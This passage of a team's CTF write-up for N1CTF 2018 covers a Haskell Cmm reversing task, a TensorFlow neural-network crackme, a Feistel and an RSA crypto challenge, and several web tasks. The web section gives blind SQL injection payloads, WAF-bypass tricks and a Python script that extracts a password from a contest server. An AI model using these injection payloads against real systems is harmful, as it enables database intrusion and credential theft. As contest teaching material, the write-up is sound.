class="hljs-number">52</span>,<span class="hljs-number">39</span>,<span class="hljs-number">69</span>,<span class="hljs-number">68</span>,<span class="hljs-number">75</span>,<span class="hljs-number">70</span>,<span class="hljs-number">92</span>,<span class="hljs-number">116</span>,<span class="hljs-number">60</span>,<span class="hljs-number">51</span>,<span class="hljs-number">71</span>,<span class="hljs-number">37</span>,<span class="hljs-number">124</span>,<span class="hljs-number">36</span>,<span class="hljs-number">99</span>,<span class="hljs-number">115</span>,<span class="hljs-number">80</span>,<span class="hljs-number">81</span>,<span class="hljs-number">109</span>,<span class="hljs-number">125</span>,<span class="hljs-number">126</span>,<span class="hljs-number">48</span>,<span class="hljs-number">64</span>,<span class="hljs-number">82</span>,<span class="hljs-number">59</span>,<span class="hljs-number">117</span>,<span class="hljs-number">85</span>,<span class="hljs-number">50</span>,<span class="hljs-number">122</span>,<span class="hljs-number">57</span>,<span class="hljs-number">105</span>,<span class="hljs-number">87</span>,<span class="hljs-number">66</span>,<span class="hljs-number">46</span>,<span class="hljs-number">47</span>,<span class="hljs-number">72</span>,<span class="hljs-number">67</span>,<span class="hljs-number">107</span>,<span class="hljs-number">33</span>,<span class="hljs-number">123</span>,<span class="hljs-number">58</span>,<span class="hljs-number">79</span>,<span class="hljs-number">100</span>,<span class="hljs-number">94</span>,<span class="hljs-number">90</span>,<span class="hljs-number">84</span>,<span class="hljs-number">55</span>,<span class="hljs-number">96</span>,<span class="hljs-number">65</span>,<span class="hljs-number">110</span>,<span class="hljs-number">108</span>,<span class="hljs-number">49</span>,<span class="hljs-number">101</span>,<span class="hljs-number">53</span>,<span class="hljs-number">76</span>,<span class="hljs-number">42</span>,<span class="hljs-number">120</span>,<span class="hljs-number">63</span>]
+
+</code></pre><p>And I also find out that there is some global constant which seems related to flag.</p>
+<pre class="hljs"><code>[section <span class="hljs-string">""</span><span class="hljs-class"><span class="hljs-keyword">data</span>" . dt_r33R_closure" {
+     <span class="hljs-title">dt_r33R_closure</span>:
+         <span class="hljs-title">const</span> <span class="hljs-type">GHC</span>.<span class="hljs-type">Types</span>.<span class="hljs-type">I</span>#<span class="hljs-title">_con_info</span>;
+         <span class="hljs-title">const</span> 0;
+ }]</span>
+
+
+
+==================== <span class="hljs-type">Output</span> <span class="hljs-type">Cmm</span> ====================
+[section <span class="hljs-string">""</span><span class="hljs-class"><span class="hljs-keyword">data</span>" . dt1_r36n_closure" {
+     <span class="hljs-title">dt1_r36n_closure</span>:
+         <span class="hljs-title">const</span> <span class="hljs-type">GHC</span>.<span class="hljs-type">Types</span>.<span class="hljs-type">I</span>#<span class="hljs-title">_con_info</span>;
+         <span class="hljs-title">const</span> 39;
+ }]</span>
+
+
+
+==================== <span class="hljs-type">Output</span> <span class="hljs-type">Cmm</span> ====================
+[section <span class="hljs-string">""</span><span class="hljs-class"><span class="hljs-keyword">data</span>" . flags1_r36o_closure" {
+     <span class="hljs-title">flags1_r36o_closure</span>:
+         <span class="hljs-title">const</span> <span class="hljs-type">Main</span>.<span class="hljs-type">Index_con_info</span>;
+         <span class="hljs-title">const</span> <span class="hljs-title">dt_r33R_closure</span>+1;
+         <span class="hljs-title">const</span> <span class="hljs-title">dt1_r36n_closure</span>+1;
+         <span class="hljs-title">const</span> 3;
+ }]</span>
+
+
+
+==================== <span class="hljs-type">Output</span> <span class="hljs-type">Cmm</span> ====================
+[section <span class="hljs-string">""</span><span class="hljs-class"><span class="hljs-keyword">data</span>" . dt2_r36p_closure" {
+     <span class="hljs-title">dt2_r36p_closure</span>:
+         <span class="hljs-title">const</span> <span class="hljs-type">GHC</span>.<span class="hljs-type">Types</span>.<span class="hljs-type">I</span>#<span class="hljs-title">_con_info</span>;
+         <span class="hljs-title">const</span> 5;
+ }]</span>
+
+
+
+==================== <span class="hljs-type">Output</span> <span class="hljs-type">Cmm</span> ====================
+[section <span class="hljs-string">""</span><span class="hljs-class"><span class="hljs-keyword">data</span>" . dt3_r36q_closure" {
+     <span class="hljs-title">dt3_r36q_closure</span>:
+         <span class="hljs-title">const</span> <span class="hljs-type">GHC</span>.<span class="hljs-type">Types</span>.<span class="hljs-type">I</span>#<span class="hljs-title">_con_info</span>;
+         <span class="hljs-title">const</span> 282;
+ }]</span>
+
+
+
+==================== <span class="hljs-type">Output</span> <span class="hljs-type">Cmm</span> ====================
+[section <span class="hljs-string">""</span><span class="hljs-class"><span class="hljs-keyword">data</span>" . flags2_r36r_closure" {
+     <span class="hljs-title">flags2_r36r_closure</span>:
+         <span class="hljs-title">const</span> <span class="hljs-type">Main</span>.<span class="hljs-type">Index_con_info</span>;
+         <span class="hljs-title">const</span> <span class="hljs-title">dt2_r36p_closure</span>+1;
+         <span class="hljs-title">const</span> <span class="hljs-title">dt3_r36q_closure</span>+1;
+         <span class="hljs-title">const</span> 3;
+ }]</span>
+
+</code></pre><p>Each byte of flag is defined by two number.</p>
+<p>We know the first byte is &#39;N&#39; and the s0_closure()[39] is also &#39;N&#39;. I thought it&#39;s not a coincidence.</p>
+<p>So I suppose that the second number is index value.</p>
+<p>Now what about the first number?</p>
+<p>After some testing and brainstorming.</p>
+<p>I figure out the complete algorithm</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">foo</span><span class="hljs-params">(n)</span>:</span>
+    <span class="hljs-keyword">if</span> n==<span class="hljs-number">0</span>:
+        <span class="hljs-keyword">return</span> s0()
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> s1()+foo(n<span class="hljs-number">-1</span>)+s2()+foo(n<span class="hljs-number">-1</span>)+s3()
+
+flag = [[<span class="hljs-number">0</span>,<span class="hljs-number">39</span>],[<span class="hljs-number">5</span>,<span class="hljs-number">282</span>],....]
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:
+    <span class="hljs-keyword">print</span> foo(i[<span class="hljs-number">0</span>])[i[<span class="hljs-number">1</span>]]
+</code></pre><p>Finally,
+The flag is <code>N1CTF{did_cmm_helped?1109ef6af4b2c6fc274ddc16ff8365d1}</code> </p>
+<h3 id="baby-neural-network-(sasdf)"><a class="header-link" href="#baby-neural-network-(sasdf)"></a>baby neural network (sasdf)</h3>
+<p>Just like common c++ reverse challenge with complex libraries, decompiled code is full of garbage. There are about 1300 lines in <code>main</code>.</p>
+<h4 id="entry"><a class="header-link" href="#entry"></a>Entry</h4>
+<p>First thing to do is to find our objective.</p>
+<pre class="hljs"><code><span class="hljs-keyword">do</span>
+{
+    v106 = *(v7 + v104);
+    *&amp;v106.m128_u64[<span class="hljs-number">0</span>] = *&amp;v106.m128_u64[<span class="hljs-number">0</span>] - *(v7 + <span class="hljs-number">5796584</span>);
+    v106.m128_f32[<span class="hljs-number">0</span>] = *&amp;v106.m128_u64[<span class="hljs-number">0</span>];
+    <span class="hljs-keyword">if</span> ( COERCE_FLOAT(_mm_and_ps(v106, xmmword_247E300)) &gt; <span class="hljs-number">1.0e-10</span> )
+    {
+        <span class="hljs-built_in">std</span>::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>, <span class="hljs-string">"Incorrect flag :("</span>);
+        <span class="hljs-keyword">goto</span> LABEL_197;
+    }
+    v7 = v7 + <span class="hljs-number">8</span>;
+}
+<span class="hljs-keyword">while</span> ( v7 != <span class="hljs-number">328</span> );
+<span class="hljs-built_in">std</span>::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(
+        &amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>,
+        <span class="hljs-string">"Congratulations! Your flag is absolutely correct."</span>);</code></pre><p>Looks like we need to make something equals to zero. However, IDA decompilied it incorrectly.</p>
+<pre class="hljs"><code><span class="hljs-keyword">call</span>     tensorflow::Tensor::shaped&lt;double,1ul&gt;(tensorflow::gtl::ArraySlice&lt;long long&gt;)
+<span class="hljs-keyword">movsd</span>    <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbx</span>+<span class="hljs-built_in">rax</span>]
+<span class="hljs-keyword">subsd</span>    <span class="hljs-built_in">xmm0</span>, predictions[<span class="hljs-built_in">rbx</span>]
+<span class="hljs-keyword">cvtsd2ss</span> <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">xmm0</span>
+<span class="hljs-keyword">andps</span>    <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:xmmword_247E300
+<span class="hljs-keyword">cvtss2sd</span> <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">xmm0</span>
+<span class="hljs-keyword">ucomisd</span>  <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:qword_247CE48
+<span class="hljs-keyword">jbe</span>      short loc_448A26
+<span class="hljs-keyword">mov</span>      <span class="hljs-built_in">esi</span>, offset aIncorrectFlag <span class="hljs-comment">; "Incorrect flag :("</span></code></pre><p>It subtracts a Tensor with <code>predictions</code>, and check if it equals to zero. Our objective is to make this Tensor equals to <code>predictions</code>.</p>
+<h4 id="dig-into"><a class="header-link" href="#dig-into"></a>Dig into</h4>
+<p>To figure out what the program is, just ignore everything drives you crazy.  </p>
+<p>At the top of main, there&#39;s some check telling us the input has length of 41.</p>
+<pre class="hljs"><code><span class="hljs-keyword">if</span> ( argc != <span class="hljs-number">2</span> )
+{
+    <span class="hljs-built_in">std</span>::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>, <span class="hljs-string">"Please supply your input"</span>);
+    <span class="hljs-keyword">goto</span> LABEL_6;
+}
+input = argv[<span class="hljs-number">1</span>];
+inputLen = <span class="hljs-number">-1</span>LL;
+<span class="hljs-comment">/* do ... while */</span>
+<span class="hljs-keyword">if</span> ( inputLen == <span class="hljs-number">-43</span> ) <span class="hljs-comment">// in fact, it's checking length == 41</span></code></pre><p>After remove all garbages, the code looks more friendly:</p>
+<pre class="hljs"><code>tensorflow::TensorShapeBase::TensorShapeBase(&amp;_placeholder, &amp;shape_1_41, <span class="hljs-number">2L</span>L);
+tensorflow::ops::Placeholder::Placeholder(&amp;placeholder, &amp;scope, <span class="hljs-number">2L</span>L, v10);
+tensorflow::TensorShapeBase::TensorShapeBase(v10, &amp;_733, <span class="hljs-number">2L</span>L); <span class="hljs-comment">// _733 = {1, 41}</span>
+tensorFromArray(&amp;bias1, <span class="hljs-number">2L</span>L, &amp;bias_layer1, <span class="hljs-number">328L</span>L, v10); <span class="hljs-comment">// 1 * 41 * 8 = 328</span>
+<span class="hljs-comment">/* ... from 1 to 5 ... */</span>
+tensorflow::TensorShapeBase::TensorShapeBase(v10, &amp;_738, <span class="hljs-number">2L</span>L); <span class="hljs-comment">// _738 = {41, 41}</span>
+tensorFromArray(&amp;w1, <span class="hljs-number">2L</span>L, &amp;weights_layer1, <span class="hljs-number">13448L</span>L, v10); <span class="hljs-comment">// 41 * 41 * 8 = 13448</span>
+<span class="hljs-comment">/* ... from 1 to 5 ... */</span>
+tensorflow::TensorShapeBase::TensorShapeBase(v10, &amp;_743, <span class="hljs-number">2L</span>L); <span class="hljs-comment">// _743 = {1, 41}</span>
+tensorFromArray(&amp;pred, <span class="hljs-number">2L</span>L, &amp;predictions, <span class="hljs-number">328L</span>L, v10);
+
+tensorflow::Tensor::Tensor(&amp;_bias1, &amp;bias1);
+tensorflow::Tensor::Tensor(&amp;_w1, &amp;w1);
+tensorflow::ops::MatMul::MatMul(&amp;v180, &amp;scope, &amp;_placeholder, v10);
+tensorflow::ops::Add::Add(&amp;v184, &amp;scope, &amp;v249, v3);
+tensorflow::ops::Sigmoid::Sigmoid(&amp;v188, &amp;scope, &amp;v239);
+
+tensorflow::Tensor::Tensor(v10, &amp;bias2);
+tensorflow::Tensor::Tensor(&amp;_placeholder, &amp;w2);
+forwardPass(&amp;v164, &amp;scope, &amp;v199, &amp;_placeholder, v10);
+<span class="hljs-comment">/* ... from 2 to 5 ... */</span>
+
+tensorflow::ClientSession::ClientSession(&amp;sess, &amp;scope);
+tensorflow::ClientSession::Run(&amp;v188, &amp;sess, &amp;v192, &amp;v142, &amp;v139);</code></pre><p>It looks like a 5-layer DNN with sigmoid as activation function. For people who isn&#39;t familiar with Deeeeeep learning, Here&#39;s math notation:
+$$
+v_0 := input\
+v_5 := output\
+v_i = sigmoid\left(v_{i-1} W_i + b_i\right)\
+sigmoid(x) = \frac{1}{1+e^{-x}}
+$$
+and the inverse is:
+$$
+sigmoid^{-1}(x) = - log\left(\frac{1}{x} - 1\right)\
+v_{i-1} = \left(sigmoid^{-1}(v_i) - b_i\right) W_i^{-1}
+$$
+we will get the flag after calculating the inverse for all layers:</p>
+<pre class="hljs"><code>[<span class="hljs-number">0.0128232</span>  <span class="hljs-number">0.02040983</span> <span class="hljs-number">0.01491556</span> <span class="hljs-number">0.01190851</span> <span class="hljs-number">0.01428702</span> ... ]</code></pre><p>... not the flag :(</p>
+<h4 id="flag???"><a class="header-link" href="#flag???"></a>Flag???</h4>
+<p>Tracing along the path about how input string goes into neural network:</p>
+<pre class="hljs"><code>_input = _argv[<span class="hljs-number">1</span>];
+<span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0L</span>L; ; i = v69++ )
+{
+    *&amp;v198[<span class="hljs-number">8</span> * v69 - <span class="hljs-number">8</span>] = <span class="hljs-number">1.0</span> / _input[i];
+    <span class="hljs-keyword">if</span> ( v69 == <span class="hljs-number">41</span> )
+        <span class="hljs-keyword">break</span>;
+}
+tensorflow::TensorShapeBase::TensorShapeBase(v10, &amp;_744, <span class="hljs-number">2L</span>L); <span class="hljs-comment">// _744 = {1, 41}</span>
+tensorFromArray(&amp;v234, <span class="hljs-number">2L</span>L, v198, <span class="hljs-number">328L</span>L, v10); <span class="hljs-comment">// 328 = 1 * 41 * 8</span></code></pre><p>flag is multicative inverse of previous result :)
+<code>N1CTF{N3ural_Network_1s_Really_Fantastic}</code></p>
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="77777-(sasdf,-bookgin)"><a class="header-link" href="#77777-(sasdf,-bookgin)"></a>77777 (sasdf, bookgin)</h3>
+<pre class="hljs"><code>sprintf(<span class="hljs-string">"UPDATE users SET points=%d%s"</span>, $_POST[<span class="hljs-string">'flag'</span>], waf($_POST[<span class="hljs-string">'hi'</span>]);</code></pre><ul class="list">
+<li><code>substring</code> is WAFed, but <code>substr</code> is not.</li>
+<li>Get length: hi=<code>9453 where LENGTH(password)&gt;14 and LENGTH(password)&lt;16</code>
+<code>=</code> is filtered by WAF.</li>
+<li>Get password: hi=<code>9453 where md5(&quot;a&quot;) like md5(substr(password, 1, 1))</code></li>
+</ul>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> requests, string, re
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">flush</span><span class="hljs-params">()</span>:</span>
+    data = dict(flag=<span class="hljs-string">''</span>,hi=<span class="hljs-string">'1234'</span>)
+    requests.post(<span class="hljs-string">'http://47.75.14.48'</span>, data=data)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guess</span><span class="hljs-params">(s)</span>:</span>
+    data = dict(
+        flag=<span class="hljs-string">''</span>,
+        hi=f<span class="hljs-string">'9453 where md5("{s}") like md5(substr(password, 1, {len(s)}))'</span>,
+    )
+    response = requests.post(<span class="hljs-string">'http://47.75.14.48'</span>, data=data).text
+    result = re.search(<span class="hljs-string">'My Points.*&lt;br/&gt;'</span>, response)
+    <span class="hljs-keyword">return</span> (result <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">None</span> <span class="hljs-keyword">and</span> <span class="hljs-string">'9453'</span> <span class="hljs-keyword">in</span> result.group(<span class="hljs-number">0</span>))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guessNext</span><span class="hljs-params">(prefix)</span>:</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string.printable:
+        flush()
+        print(prefix, i)
+        <span class="hljs-keyword">if</span> guess(prefix + i):
+            <span class="hljs-keyword">return</span> prefix + i
+    <span class="hljs-keyword">raise</span> RuntimeError(pwd, <span class="hljs-string">'next char not found'</span>)
+
+pwd=<span class="hljs-string">''</span>
+<span class="hljs-keyword">while</span> len(pwd) != <span class="hljs-number">15</span>:
+    pwd = guessNext(pwd)</code></pre><p><a href="https://github.com/rkmylo/ctf-write-ups/blob/master/2018-n1ctf/web/77777-104/solve.py">Someone</a> provides this shorter payload `ord(substr(password,INDEX,1))</p>
+<h3 id="77777-2-(bookgin)-unsolved"><a class="header-link" href="#77777-2-(bookgin)-unsolved"></a>77777 2 (bookgin) unsolved</h3>
+<ul class="list">
+<li>The column name <code>pw</code> is WAFed, but in fact it just <strong>did not allow the <code>pw</code> keyword to be prefixed or followed by any characters apart from whitespaces</strong>.  (why....?)</li>
+<li><code>where</code> is WAFed.</li>
+<li>Not WAFed: <code>substr select from if &amp; *</code></li>
+<li>Payload: <code>convert(hex(substr( pw ,1 ,1)),signed)</code></li>
+</ul>
+<p>Reference: </p>
+<ul class="list">
+<li><a href="https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/77777-2-208">https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/77777-2-208</a></li>
+<li><a href="https://delcoding.github.io/2018/03/n1ctf-writeup/">https://delcoding.github.io/2018/03/n1ctf-writeup/</a></li>
+</ul>
+<h3 id="babysqli-(bookgin)-unsolved"><a class="header-link" href="#babysqli-(bookgin)-unsolved"></a>babysqli (bookgin) unsolved</h3>
+<p>sql injection 的點是使用者大頭照，有 <code>1.png</code> &amp; <code>2.png</code>，但 <code>information</code> 被 WAF，所以不好取得 database_name</p>
+<p>Payload 1: </p>
+<pre class="hljs"><code>'or((<span class="hljs-keyword">select</span>(<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span>(<span class="hljs-keyword">user</span>())),&lt;GUESS_INDEX&gt;,<span class="hljs-number">1</span>))=<span class="hljs-string">'&lt;GUESS_CHAR&gt;'</span>)=<span class="hljs-number">1</span>)#<span class="hljs-string">`</span></code></pre><p>Payload 2:</p>
+<pre class="hljs"><code>'=if(ascii(substring((<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(database_name))<span class="hljs-keyword">from</span>(mysql.innodb_table_stats)),%d,<span class="hljs-number">1</span>))&gt;%d,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)=<span class="hljs-string">'</span></code></pre><ul class="list">
+<li>然後拿到 database <code>sys，mysql，n1ctf_2018_venenof7</code></li>
+<li><code>n1ctf_2018_venenof7</code> 有<code>vimg,vusers</code> 兩張 tables</li>
+<li><code>vusers</code> 有個 column 叫 <code>password</code> ，跑出来<code>ac895b772a4ec1eff81e07aa2907afe3</code></li>
+</ul>
+<p>拿去主辦官方的網頁做 md5 decrypt 噴 flag</p>
+<p>Reference: </p>
+<ul class="list">
+<li><a href="http://www.bendawang.site/2018/03/13/N1CTF-2018-Web-writeup/">http://www.bendawang.site/2018/03/13/N1CTF-2018-Web-writeup/</a></li>
+<li><a href="https://github.com/Nu1LCTF/n1ctf-2018/blob/master/writeups/web/babysqli.md">https://github.com/Nu1LCTF/n1ctf-2018/blob/master/writeups/web/babysqli.md</a></li>
+<li><a href="http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/">http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/</a></li>
+</ul>
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="baby_n1es-(shw)"><a class="header-link" href="#baby_n1es-(shw)"></a>baby_N1ES (shw)</h3>
+<p>We are given the source code of encryption and a ciphertext.</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span><span class="hljs-params">(self, plaintext)</span>:</span>
+    <span class="hljs-keyword">if</span> (len(plaintext) % <span class="hljs-number">16</span> != <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> isinstance(plaintext, bytes) == <span class="hljs-keyword">False</span>):
+        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">"plaintext must be a multiple of 16 in length"</span>)
+    res = <span class="hljs-string">''</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(plaintext) / <span class="hljs-number">16</span>):
+        block = plaintext[i * <span class="hljs-number">16</span>:(i + <span class="hljs-number">1</span>) * <span class="hljs-number">16</span>]
+        L = block[:<span class="hljs-number">8</span>]
+        R = block[<span class="hljs-number">8</span>:]
+        <span class="hljs-keyword">for</span> round_cnt <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>):
+            L, R = R, (round_add(L, self.Kn[round_cnt]))
+        L, R = R, L
+        res += L + R
+    <span class="hljs-keyword">return</span> res</code></pre><p>And the function <code>round_add()</code>:</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">round_add</span><span class="hljs-params">(a, b)</span>:</span>
+    f = <span class="hljs-keyword">lambda</span> x, y: x + y - <span class="hljs-number">2</span> * (x &amp; y)
+    res = <span class="hljs-string">''</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(a)):
+        res += chr(f(ord(a[i]), ord(b[i])))
+    <span class="hljs-keyword">return</span> res</code></pre><p>Note that if <code>m = round_add(a, b)</code>, then <code>a = round_add(m, b)</code>, and also it is a Feistel cipher. Thus, we can decrypt the ciphertext by simply reversing the key schedule.</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> N1ES <span class="hljs-keyword">import</span> N1ES
+<span class="hljs-keyword">import</span> base64
+
+key = <span class="hljs-string">"wxy191iss00000000000cute"</span>
+n1es = N1ES(key)
+c = <span class="hljs-string">'HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx'</span>
+
+n1es.Kn = n1es.Kn[::<span class="hljs-number">-1</span>]
+<span class="hljs-keyword">print</span> n1es.encrypt(base64.b64decode(c))</code></pre><p>FLAG: <code>N1CTF{F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/}</code></p>
+<h3 id="rsa_padding-(shw)"><a class="header-link" href="#rsa_padding-(shw)"></a>rsa_padding (shw)</h3>
+<p>We are given the source code of encryption, where <code>m</code> contains the flag, and <code>e = 3</code>.</p>
+<pre class="hljs"><code>mm = bytes_to_long(m)
+<span class="hljs-keyword">assert</span> pow(mm, e) != pow(mm, e, n)
+sys.stdout.write(<span class="hljs-string">"Please give me a padding: "</span>)
+padding = input().strip()
+padding = int(sha256(padding.encode()).hexdigest(),<span class="hljs-number">16</span>)
+c = pow(mm+padding, e, n)
+print(<span class="hljs-string">"Your Ciphertext is: %s"</span>%c)</code></pre><p>Some <a href="https://github.com/p4-team/ctf/tree/master/2018-03-10-n1ctf/crypto_rsapadding">write-ups</a> point out that this encryption is vulnerable to <a href="https://en.wikipedia.org/wiki/Coppersmith%27s_attack#Franklin-Reiter_related-message_attack"><em>Franklin-Reiter related-message attack</em></a>. Simply speaking, the congruence equation $c \equiv (m + p)^3\ \mathrm{mod}\ n$ can be reduced to a linear congruence equation of $m$ and be solved easily, if we have at least three pairs of $(p, c)$.
+Then, we get m = <code>Welcom to Nu1L CTF, Congratulations, You get flag, and flag is N1CTF{f7efbf4e5f5ef78ca1fb9c8f5eb02635}</code>.</p>
+<h2 id="ppc"><a class="header-link" href="#ppc"></a>PPC</h2>
+<h3 id="losetome-(how2hack)"><a class="header-link" href="#losetome-(how2hack)"></a>losetome (how2hack)</h3>
+<p>I dunno... just try to lose Reversi against AI =w=
+FLAG: <code>N1CTF{Oh!you_1ose_t0_AI_hhhhhh}</code></p>
+<h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
